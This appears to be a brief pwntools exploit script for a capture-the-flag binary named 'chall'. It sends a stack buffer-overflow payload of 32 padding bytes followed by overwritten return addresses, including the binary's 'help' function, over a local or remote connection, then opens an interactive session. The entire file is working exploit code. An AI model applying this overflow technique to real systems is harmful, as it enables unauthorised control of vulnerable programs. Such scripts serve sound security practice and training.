from pwn import *


elf = context.binary = ELF('./chall')

HOST,PORT='',1203
if len(sys.argv)>1:
    p = remote(HOST,PORT)
else:
    p = process()
    attach(p)


#0x08049009
payload =b'A'*32+p32(0x08049009)+p32(elf.sym.help)*2
p.sendline(payload)
p.interactive()